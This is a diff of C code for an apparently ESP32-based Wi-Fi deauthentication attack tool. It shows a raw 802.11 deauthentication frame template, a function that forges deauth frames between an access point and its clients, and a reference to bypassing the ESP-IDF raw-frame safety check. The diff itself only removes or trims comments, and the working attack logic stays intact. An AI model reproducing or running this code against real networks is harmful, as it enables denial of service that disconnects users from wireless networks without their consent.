@@ -17,13 +17,13 @@
 
 // Deauthentication frame template (26 bytes)
 static uint8_t deauth_frame_default[26] = {
-    0xc0, 0x00, // Frame Control: Deauthentication frame
+    0xc0, 0x00, // Frame Control:
     0x3a, 0x01, // Duration
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination Address (broadcast)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (AP BSSID)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0xf0, 0xff, // Sequence Number
-    0x02, 0x00  // Reason Code: Class 2 frame received from non-authenticated station
+    0xf0, 0xff, 
+    0x02, 0x00 
 };
 
 // Bypass ESP-IDF safety sanity check for raw frame transmission
@@ -40,15 +40,15 @@ void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     }
     vTaskDelay(1 / portTICK_PERIOD_MS);
 
-    // Build AP source packet (AP to client)
-    deauth_frame_default[4] = mac[0];  // Destination: Client MAC
+    // Build AP source packet
+    deauth_frame_default[4] = mac[0];  // Destination Client MAC
     deauth_frame_default[5] = mac[1];
     deauth_frame_default[6] = mac[2];
     deauth_frame_default[7] = mac[3];
     deauth_frame_default[8] = mac[4];
     deauth_frame_default[9] = mac[5];
 
-    deauth_frame_default[10] = bssid[0]; // Source: AP BSSID
+    deauth_frame_default[10] = bssid[0]; // Source AP BSSID
     deauth_frame_default[11] = bssid[1];
     deauth_frame_default[12] = bssid[2];
     deauth_frame_default[13] = bssid[3];
@@ -68,7 +68,6 @@ void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
         ESP_LOGE(TAG, "Failed to send AP-to-client deauth frame: %s", esp_err_to_name(err));
     }
 
-    // Build client source packet (client to AP)
     deauth_frame_default[4] = bssid[0];  // Destination: AP BSSID
     deauth_frame_default[5] = bssid[1];
     deauth_frame_default[6] = bssid[2];
